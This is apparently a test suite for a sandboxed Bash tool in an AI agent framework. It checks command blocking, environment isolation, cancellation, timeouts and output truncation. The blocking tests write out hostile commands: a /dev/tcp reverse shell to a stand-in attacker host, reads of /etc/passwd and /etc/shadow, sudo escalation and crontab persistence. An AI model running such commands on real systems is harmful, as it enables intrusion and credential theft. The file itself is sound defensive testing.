import { describe, expect, test } from "bun:test";
import { realpathSync } from "node:fs";
import { createBashTool } from "./bash-tool.js";

// ---------------------------------------------------------------------------
// Unit tests — security blocking
// ---------------------------------------------------------------------------

describe("createBashTool — security blocking", () => {
  const tool = createBashTool({ workspaceRoot: "/workspace" });

  async function exec(
    command: string,
    opts?: { cwd?: string; timeoutMs?: number },
  ): Promise<Record<string, unknown>> {
    const result = await tool.execute({ command, ...opts }, {});
    return result as Record<string, unknown>;
  }

  test("blocks reverse shell via /dev/tcp", async () => {
    const result = await exec("bash -i >& /dev/tcp/attacker/4444 0>&1");
    expect(result.error).toMatch(/blocked/i);
    expect(result.category).toBe("reverse-shell");
  });

  test("blocks eval injection", async () => {
    const result = await exec("eval $(cat /etc/passwd)");
    expect(result.error).toMatch(/blocked/i);
    expect(result.category).toBe("injection");
  });

  test("blocks sudo privilege escalation", async () => {
    const result = await exec("sudo cat /etc/shadow");
    expect(result.error).toMatch(/blocked/i);
    expect(result.category).toBe("privilege-escalation");
  });

  test("blocks crontab persistence", async () => {
    const result = await exec("crontab -e");
    expect(result.error).toMatch(/blocked/i);
    expect(result.category).toBe("persistence");
  });

  test("blocks path traversal in cwd", async () => {
    const result = await exec("ls", { cwd: "../../etc" });
    expect(result.error).toMatch(/blocked/i);
    expect(result.category).toBe("path-traversal");
  });

  test("blocks cwd escaping workspace root (when workspaceRoot is set)", async () => {
    const restricted = createBashTool({ workspaceRoot: "/workspace" });
    const result = (await restricted.execute({ command: "ls", cwd: "/etc" }, {})) as Record<
      string,
      unknown
    >;
    expect(result.error).toMatch(/blocked/i);
    expect(result.category).toBe("path-traversal");
  });

  test("blocks empty command", async () => {
    const result = await exec("   ");
    expect(result.error).toBeDefined();
  });

  test("blocked result includes reason and pattern fields", async () => {
    const result = await exec("sudo whoami");
    expect(result.error).toBeDefined();
    expect(typeof result.reason).toBe("string");
    expect(typeof result.pattern).toBe("string");
    expect(typeof result.category).toBe("string");
  });

  describe("allowlist gate", () => {
    const restricted = createBashTool({
      policy: { allowlist: ["git ", "ls", "echo "] },
    });

    test("allows allowlisted command", async () => {
      const result = (await restricted.execute({ command: "git --version" }, {})) as Record<
        string,
        unknown
      >;
      // Should not be blocked (might fail if git not installed, but won't be a security block)
      if (typeof result.error === "string") {
        expect(result.category).not.toBe("injection"); // not blocked by allowlist
      }
    });

    test("blocks non-allowlisted command", async () => {
      const result = (await restricted.execute({ command: "cat README.md" }, {})) as Record<
        string,
        unknown
      >;
      expect(result.error).toMatch(/blocked/i);
    });
  });
});

// ---------------------------------------------------------------------------
// Integration tests — real subprocess execution
// ---------------------------------------------------------------------------

describe("createBashTool — integration (real subprocess)", () => {
  const tool = createBashTool();

  async function exec(
    command: string,
    opts?: { cwd?: string; timeoutMs?: number },
  ): Promise<Record<string, unknown>> {
    const result = await tool.execute({ command, ...opts }, {});
    return result as Record<string, unknown>;
  }

  test("executes simple echo command", async () => {
    const result = await exec("echo hello");
    expect(result.exitCode).toBe(0);
    expect(String(result.stdout).trim()).toBe("hello");
    expect(result.stderr).toBe("");
    expect(typeof result.durationMs).toBe("number");
  });

  test("captures stderr separately", async () => {
    const result = await exec("echo err >&2");
    expect(result.exitCode).toBe(0);
    expect(String(result.stderr).trim()).toBe("err");
  });

  test("returns non-zero exit code on command failure", async () => {
    // set -e means exit on error, but we capture the exit code
    const result = await exec("exit 42");
    expect(result.exitCode).toBe(42);
  });

  test("set -euo pipefail: fails on undefined variable", async () => {
    const result = await exec("echo $UNDEFINED_VAR_KOI_TEST");
    // With set -u, referencing an unset variable causes non-zero exit
    expect(result.exitCode).not.toBe(0);
  });

  test("multiline command executes correctly", async () => {
    const result = await exec("x=hello\necho $x");
    expect(result.exitCode).toBe(0);
    expect(String(result.stdout).trim()).toBe("hello");
  });

  test("cwd is used as working directory", async () => {
    const result = await exec("pwd", { cwd: "/tmp" });
    expect(result.exitCode).toBe(0);
    // /tmp is a symlink to /private/tmp on macOS — use realpathSync to match
    expect(String(result.stdout).trim()).toBe(realpathSync("/tmp"));
  });

  test("result includes durationMs", async () => {
    const result = await exec("echo test");
    expect(typeof result.durationMs).toBe("number");
    expect(result.durationMs as number).toBeGreaterThan(0);
  });

  test("env isolation: HOME and PATH are set", async () => {
    const result = await exec("echo $HOME $PATH");
    expect(result.exitCode).toBe(0);
    const stdout = String(result.stdout).trim();
    expect(stdout.length).toBeGreaterThan(0);
  });

  test("env isolation: env vars from test process do not leak into subprocess", async () => {
    process.env.KOI_BASH_TOOL_TEST_SENTINEL = "should-not-leak";
    // List all subprocess env vars — the sentinel must not appear
    const result = await exec("env");
    delete process.env.KOI_BASH_TOOL_TEST_SENTINEL;
    expect(result.exitCode).toBe(0);
    expect(String(result.stdout)).not.toContain("KOI_BASH_TOOL_TEST_SENTINEL");
  });
});

// ---------------------------------------------------------------------------
// Cancellation tests — AbortSignal + subprocess kill
// ---------------------------------------------------------------------------

describe("createBashTool — cancellation and timeout", () => {
  const tool = createBashTool();

  test("AbortSignal cancels running subprocess", async () => {
    const controller = new AbortController();
    const startTime = Date.now();

    // Start a 60-second sleep
    const execPromise = tool.execute({ command: "sleep 60" }, { signal: controller.signal });

    // Cancel after a short delay
    setTimeout(() => controller.abort(), 100);

    const result = (await execPromise) as Record<string, unknown>;
    const elapsed = Date.now() - startTime;

    // Should complete much faster than 60s
    expect(elapsed).toBeLessThan(5_000);
    // Subprocess should have been killed (non-zero exit)
    expect(result.exitCode).not.toBe(0);
  });

  test("timeoutMs kills subprocess after timeout", async () => {
    const startTime = Date.now();

    const result = (await tool.execute({ command: "sleep 60", timeoutMs: 200 }, {})) as Record<
      string,
      unknown
    >;

    const elapsed = Date.now() - startTime;
    expect(elapsed).toBeLessThan(5_000);
    expect(result.timedOut).toBe(true);
    expect(result.exitCode).not.toBe(0);
  });

  test("pre-aborted signal prevents spawn", async () => {
    const controller = new AbortController();
    controller.abort();

    await expect(
      tool.execute({ command: "echo should-not-run" }, { signal: controller.signal }),
    ).rejects.toBeDefined();
  });

  test("subsequent execution works after cancellation", async () => {
    const controller = new AbortController();

    const cancelledExec = tool.execute({ command: "sleep 60" }, { signal: controller.signal });
    setTimeout(() => controller.abort(), 50);
    await cancelledExec.catch(() => {});

    // Should still work after a cancelled execution
    const result = (await tool.execute({ command: "echo still-works" }, {})) as Record<
      string,
      unknown
    >;
    expect(result.exitCode).toBe(0);
    expect(String(result.stdout).trim()).toBe("still-works");
  });
});

// ---------------------------------------------------------------------------
// Output budgeting tests
// ---------------------------------------------------------------------------

describe("createBashTool — output budgeting", () => {
  test("truncates output exceeding maxOutputBytes", async () => {
    const tool = createBashTool({ policy: { maxOutputBytes: 100 } });

    // Generate output larger than 100 bytes
    const result = (await tool.execute(
      { command: "python3 -c \"print('x' * 200)\" 2>/dev/null || printf '%0.s x' {1..200}" },
      {},
    )) as Record<string, unknown>;

    if (result.truncated === true) {
      expect(result.truncatedNote).toMatch(/100 bytes/);
    }
    // Either truncated or the command failed — both acceptable
    expect(result.error).toBeUndefined();
  });

  test("does not set truncated for small output", async () => {
    const tool = createBashTool({ policy: { maxOutputBytes: 1_000_000 } });
    const result = (await tool.execute({ command: "echo small" }, {})) as Record<string, unknown>;
    expect(result.truncated).toBeUndefined();
    expect(result.exitCode).toBe(0);
  });
});

// ---------------------------------------------------------------------------
// Tool descriptor validation
// ---------------------------------------------------------------------------

describe("createBashTool — tool descriptor", () => {
  test("has correct descriptor shape", () => {
    const tool = createBashTool();
    expect(tool.descriptor.name).toBe("Bash");
    expect(typeof tool.descriptor.description).toBe("string");
    expect(tool.descriptor.description.length).toBeGreaterThan(0);
    expect(tool.origin).toBe("primordial");
  });

  test("input schema requires command field", () => {
    const schema = createBashTool().descriptor.inputSchema;
    expect((schema as Record<string, unknown>).required).toContain("command");
  });
});
